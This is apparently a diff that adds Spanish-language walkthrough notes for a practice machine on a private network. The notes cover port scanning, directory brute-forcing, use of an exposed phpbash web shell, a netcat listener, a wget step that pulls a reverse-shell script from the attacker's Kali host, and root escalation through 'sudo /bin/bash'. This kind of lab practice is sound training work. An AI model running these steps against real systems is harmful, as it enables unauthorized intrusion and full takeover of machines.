@@ -1,0 +1,24 @@
+nmap -sV 192.168.0.27 --open
+
+gobuster dir -u http://192.168.0.27/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
+
+- Ingreso a la ruta http://192.168.0.27/phpbash.php
+
+- luego nos conectamos a:
+
+nc -lvp 4444
+
+- buscamos un shell reverse en internet o lo que podemos es crear un codigo en bash, python, etc que realice 
+un shell reverse, luego en el bash de la maquina vulnerable colocamos "wget http://192.168.0.29/shell.bash"
+ya con esto subimos el arhivo de nuestra maquina kali a la maquina victima ahora solo debemos ir a
+  
+http://192.168.0.27/shell.bash
+
+- y ya estamos conectados desde kali
+
+- con el comando "echo -n "rootroot1" | md5sum" convertimos la cadena "rootroot1" en un hash md5 
+
+- con el comando "sudo -l" podemos ver todas las entradas de sudoer
+- si vemos que dice esto "User armour may run the following commands" entonces buscamos
+si esta el "/bin/bash" entonces podemos ejecutarlo para levantar privilegios y es de esta manera
+"sudo /bin/bash"
